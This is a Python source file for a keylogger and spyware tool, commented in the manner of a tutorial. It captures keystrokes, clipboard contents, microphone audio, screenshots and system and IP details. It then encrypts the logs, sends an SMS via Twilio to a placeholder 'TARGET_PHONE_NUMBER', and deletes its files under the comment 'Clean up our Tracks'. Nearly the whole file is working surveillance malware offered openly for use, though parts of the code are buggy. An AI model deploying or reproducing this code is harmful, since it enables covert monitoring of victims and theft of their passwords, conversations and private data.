''' The OS module in Python provides functions for interacting with the operating system. OS comes under Python’s standard utility modules. This module provides a portable way of using operating system-dependent functionality. '''

import os

''' Python's time module allows to work with time in Python. It allows functionality like getting the current time, pausing the Program from executing, etc. '''

import time

''' Socket programming is a way of connecting two nodes on a network to communicate with each other. One socket(node) listens on a particular port at an IP, while the other socket reaches out to the other to form a connection. The server forms the listener socket while the client reaches out to the server.  '''

import socket

''' In many programs we need a secure the data or program then this case we use some secret key or passwords to identifying the users. Using getpass() it is possible to accept the password in python program. '''

import getpass

''' The Platform module is used to retrieve as much possible information about the platform on which the program is being currently executed. '''

import platform

''' Used pywin32 for retrieving the clipboard text. '''

import win32clipboard

''' sounddevice module provides bindings for the PortAudio library and a few convenience functions to play and record NumPy arrays containing audio signals. '''

import sounddevice as sd

''' requests module for get/post requests '''

from requests import get

''' PIL is the Python Imaging Library which provides the python interpreter with image editing 
capabilities. The ImageGrab module can be used to copy the contents of the screen or the clipboard to a PIL image memory. '''

from PIL import ImageGrab

''' Twilio library forinteracting with Twilio's features. '''

from twilio.rest import Client

''' SciPy is a scientific computation library that uses NumPy underneath. SciPy stands for Scientific Python. It provides more utility functions for optimization, stats and signal processing '''

from scipy.io.wavfile import write

''' Fernet guarantees that a message encrypted using it cannot be manipulated or read without the key. Fernet is an implementation of symmetric (also known as “secret key”) authenticated cryptography. '''

from cryptography.fernet import Fernet

''' This library allows you to control and monitor input devices. Currently, mouse and keyboard input and monitoring are supported. '''

from pynput.keyboard import Key, Listener

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

''' Twilio's credentials '''

account_sid = "TWILIO_ACCOUNT_SID"
auth_token ="TWILIO_ACCOUNT_TOKEN"
client = Client(account_sid, auth_token)

username = getpass.getuser()

''' Generate an encryption key from the Cryptography folder. '''

key = ""

''' Enter the file path where your files will be stored. '''

file_path = ""

extend = "\\"
file_merge = file_path + extend

''' Get the computer information. '''

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

''' Get the clipboard contents. '''

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()

''' Geting the Microphone '''

def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

microphone()

''' Get screenshots '''

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

''' Timer for keylogger '''

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot() 

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration


''' Encrypt Files '''

files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read() 

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    ''' Sending all the information to Twilio's SMS Account.'''

    message = client.messages \
    .create(
         body='CRUCIAL INFORMATION WILL BE SEND FROM HERE!',
         from_='TWILIO_PHONE_NUMBER',
         to='TARGET_PHONE_NUMBER'
     )

    print(message.sid)
    count += 1

''' Clean up our Tracks & Delete Files '''

delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)